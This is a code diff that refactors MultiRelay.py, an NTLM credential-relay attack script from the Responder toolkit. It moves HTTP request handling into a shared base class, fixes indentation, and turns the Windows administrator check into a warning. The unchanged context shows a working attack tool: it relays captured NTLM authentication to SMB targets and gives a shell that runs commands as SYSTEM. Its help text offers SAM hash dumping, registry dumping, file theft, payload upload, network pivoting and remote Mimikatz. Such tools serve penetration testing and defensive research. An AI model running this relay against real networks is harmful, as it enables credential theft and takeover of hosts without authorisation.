@@ -15,8 +15,6 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import platform
-if platform.system() == 'Windows':
-	import ctypes
 import sys
 import re
 import os
@@ -45,15 +43,19 @@ from SMBFinger.Finger import RunFinger,ShowSigning,RunPivotScan
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
 from socket import *
 
+isWin = platform.system() == 'Windows'
+if isWin:
+	import ctypes
+
 __version__ = "2.0"
 
 
 MimikatzFilename	= "./MultiRelay/bin/mimikatz.exe"
 Mimikatzx86Filename = "./MultiRelay/bin/mimikatz_x86.exe"
 RunAsFileName		= "./MultiRelay/bin/Runas.exe"
-SysSVCFileName	  = "./MultiRelay/bin/Syssvc.exe"
+SysSVCFileName		= "./MultiRelay/bin/Syssvc.exe"
 
-isWin = platform.system() == 'Windows'
+
 
 def color(txt, code = 1, modifier = 0):
 	if isWin:
@@ -95,8 +97,8 @@ if options.ExtraPort is None:
 
 if isWin:
 	if ctypes.windll.shell32.IsUserAnAdmin() == 0:
-		print color("[!] MultiRelay must be run as Administrator.")
-		sys.exit(-1)
+		print color("[!] MultiRelay should be run with administrator privileges. But it could work regardless")
+		#sys.exit(-1)
 else:
 	if not os.geteuid() == 0:
 		print color("[!] MultiRelay must be run as root.")
@@ -105,57 +107,57 @@ else:
 if isWin and options.forceSMB:
 	print "Warning: You have chosen to create an SMB listener under Windows, \r\nthis will fail if you did not turn off the corresponding Windows services which are running by default. (Workstation, TCP/IP Netbios, Netlogon)"
 
-forceSMB		 = options.forceSMB
+forceSMB		= options.forceSMB
 OneCommand		= options.OneCommand
-Dump			 = options.Dump
+Dump			= options.Dump
 ExtraPort		= options.ExtraPort
-UserToRelay	  = options.UserToRelay
+UserToRelay		= options.UserToRelay
 
-Host			 = [options.TARGET]
-Cmd			  = []
+Host			= [options.TARGET]
+Cmd				= []
 ShellOpen		= []
-Pivoting		 = [2]
+Pivoting		= [2]
 
 
 
 def ShowWelcome():
-	 print color('\nResponder MultiRelay %s NTLMv1/2 Relay' %(__version__),8,1)
-	 print '\nSend bugs/hugs/comments to: laurent.gaffie@gmail.com'
-	 print 'Usernames to relay (-u) are case sensitive.'
-	 print 'To kill this script hit CRTL-C.\n'
-	 print color('/*',8,1)
-	 print 'Use this script in combination with Responder.py for best results.'
-	 print 'Make sure to set SMB and HTTP to OFF in Responder.conf.\n'
-	 print 'This tool listen on TCP port 80, 3128 and 445.'
-	 print 'For optimal pwnage, launch Responder only with these 2 options:'
-	 print '-rv\nAvoid running a command that will likely prompt for information like net use, etc.'
-	 print 'If you do so, use taskkill (as system) to kill the process.'
-	 print color('*/',8,1)
-	 print color('\nRelaying credentials for these users:',8,1)
-	 print color(UserToRelay,4,1)
-	 print '\n'
+	print color('\nResponder MultiRelay %s NTLMv1/2 Relay' %(__version__),8,1)
+	print '\nSend bugs/hugs/comments to: laurent.gaffie@gmail.com'
+	print 'Usernames to relay (-u) are case sensitive.'
+	print 'To kill this script hit CRTL-C.\n'
+	print color('/*',8,1)
+	print 'Use this script in combination with Responder.py for best results.'
+	print 'Make sure to set SMB and HTTP to OFF in Responder.conf.\n'
+	print 'This tool listen on TCP port 80, 3128 and 445.'
+	print 'For optimal pwnage, launch Responder only with these 2 options:'
+	print '-rv\nAvoid running a command that will likely prompt for information like net use, etc.'
+	print 'If you do so, use taskkill (as system) to kill the process.'
+	print color('*/',8,1)
+	print color('\nRelaying credentials for these users:',8,1)
+	print color(UserToRelay,4,1)
+	print '\n'
 
 
 ShowWelcome()
 
 def ShowHelp():
-	 print color('Available commands:',8,0)
-	 print color('dump',8,1)+'				-> Extract the SAM database and print hashes.'
-	 print color('regdump KEY',8,1)+'		-> Dump an HKLM registry key (eg: regdump SYSTEM)'
-	 print color('read Path_To_File',8,1)+'  -> Read a file (eg: read /windows/win.ini)'
-	 print color('get  Path_To_File',8,1)+'  -> Download a file (eg: get users/administrator/desktop/password.txt)'
-	 print color('delete Path_To_File',8,1)+'-> Delete a file (eg: delete /windows/temp/executable.exe)'
-	 print color('upload Path_To_File',8,1)+'-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \\windows\\temp\\'
-	 print color('runas  Command',8,1)+'	 -> Run a command as the currently logged in user. (eg: runas whoami)'
-	 print color('scan /24',8,1)+'			-> Scan (Using SMB) this /24 or /16 to find hosts to pivot to'
-	 print color('pivot  IP address',8,1)+'  -> Connect to another host (eg: pivot 10.0.0.12)'
-	 print color('mimi  command',8,1)+'	  -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)'
-	 print color('mimi32  command',8,1)+'	-> Run a remote Mimikatz 32 bits command (eg: mimi coffee)'
-	 print color('lcmd  command',8,1)+'	  -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)'
-	 print color('help',8,1)+'				-> Print this message.'
-	 print color('exit',8,1)+'				-> Exit this shell and return in relay mode.'
-	 print '					  If you want to quit type exit and then use CRTL-C\n'
-	 print color('Any other command than that will be run as SYSTEM on the target.\n',8,1)
+	print color('Available commands:',8,0)
+	print color('dump',8,1)+'				-> Extract the SAM database and print hashes.'
+	print color('regdump KEY',8,1)+'		-> Dump an HKLM registry key (eg: regdump SYSTEM)'
+	print color('read Path_To_File',8,1)+'  -> Read a file (eg: read /windows/win.ini)'
+	print color('get  Path_To_File',8,1)+'  -> Download a file (eg: get users/administrator/desktop/password.txt)'
+	print color('delete Path_To_File',8,1)+'-> Delete a file (eg: delete /windows/temp/executable.exe)'
+	print color('upload Path_To_File',8,1)+'-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \\windows\\temp\\'
+	print color('runas  Command',8,1)+'	 -> Run a command as the currently logged in user. (eg: runas whoami)'
+	print color('scan /24',8,1)+'			-> Scan (Using SMB) this /24 or /16 to find hosts to pivot to'
+	print color('pivot  IP address',8,1)+'  -> Connect to another host (eg: pivot 10.0.0.12)'
+	print color('mimi  command',8,1)+'	  -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)'
+	print color('mimi32  command',8,1)+'	-> Run a remote Mimikatz 32 bits command (eg: mimi coffee)'
+	print color('lcmd  command',8,1)+'	  -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)'
+	print color('help',8,1)+'				-> Print this message.'
+	print color('exit',8,1)+'				-> Exit this shell and return in relay mode.'
+	print '					  If you want to quit type exit and then use CRTL-C\n'
+	print color('Any other command than that will be run as SYSTEM on the target.\n',8,1)
 
 Logs_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/../"
 Logs = logging
@@ -212,8 +214,35 @@ def ConnectToTarget():
 				
 			except:
 				pass
+				
+class HTTPHandler(BaseRequestHandler):
+	def recv_HTTP_Req(self):
+		remaining = 10*1024*1024 #setting max recieve size
+		data = ''
+		while True:
+			buff = ''
+			buff = self.request.recv(8092)
+			if buff == '':
+				break
+			data += buff
+			remaining -= len(buff)
+			if remaining <= 0:
+				break
+			#check if we recieved the full header
+			if data.find('\r\n\r\n') != -1: 
+				#we did, now to check if there was anything else in the request besides the header
+				if data.find('Content-Length') == -1:
+					#request contains only header
+					break
+			else:
+				#searching for that content-length field in the header
+				for line in data.split('\r\n'):
+					if line.find('Content-Length') != -1:
+						line = line.strip()
+						remaining = int(line.split(':')[1].strip()) - len(data)
+		return data
 
-class HTTPProxyRelay(BaseRequestHandler):
+class HTTPProxyRelay(HTTPHandler):
 	 
 	def handle(self):
 
@@ -308,34 +337,7 @@ class HTTPProxyRelay(BaseRequestHandler):
 			##No need to print anything (timeouts, rst, etc) to the user console..
 			pass
 
-class HTTPRelay(BaseRequestHandler):
-
-	def recv_HTTP(self):
-		remaining = 10*1024*1024 #setting max recieve size
-		data = ''
-		while True:
-			buff = ''
-			buff = self.request.recv(8092)
-			if buff == '':
-				break
-			data += buff
-			remaining -= len(buff)
-			if remaining <= 0:
-				break
-			#check if we recieved the full header
-			if data.find('\r\n\r\n') != -1: 
-				#we did, now to check if there was anything else in the request besides the header
-				if data.find('Content-Length') == -1:
-					#request contains only header
-					break
-			else:
-				#searching for that content-length field in the header
-				for line in data.split('\r\n'):
-					if line.find('Content-Length') != -1:
-						line = line.strip()
-						remaining = int(line.split(':')[1].strip()) - len(data)
-		return data
-				
+class HTTPRelay(HTTPHandler):				
 	 
 	def handle(self):
 		try:
@@ -350,13 +352,13 @@ class HTTPRelay(BaseRequestHandler):
 		try:
 			s = ConnectToTarget()
 		
-			data = self.recv_HTTP()
+			data = self.recv_HTTP_Req()
 			#print 'Incoming HTTP request: ' + data
 			Webdav = ServeOPTIONS(data)
 			if Webdav:
 				#If it is, send the option answer, we'll send him to auth when we receive a profind.
 				self.request.sendall(Webdav)
-				data = self.recv_HTTP()
+				data = self.recv_HTTP_Req()
 
 			NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
 			##Make sure incoming packet is an NTLM auth, if not send HTTP 407.
@@ -388,7 +390,7 @@ class HTTPRelay(BaseRequestHandler):
 					Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
 					key = ExtractHTTPChallenge(smbdata,Pivoting)#Grab challenge key for later use (hash parsing).
 					self.request.sendall(str(Buffer_Ans)) #We send NTLM message 2 to the client.
-					data = self.recv_HTTP()
+					data = self.recv_HTTP_Req()
 					NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
 					Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]
 
@@ -399,7 +401,7 @@ class HTTPRelay(BaseRequestHandler):
 						if IsSMBAnonymous(NTLM_Auth):
 							Response = IIS_Auth_401_Ans()
 							self.request.sendall(str(Response))
-							data = self.recv_HTTP()
+							data = self.recv_HTTP_Req()
 						else:
 							#Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
 							#and has not attempted before. While at it, let's grab his hash.
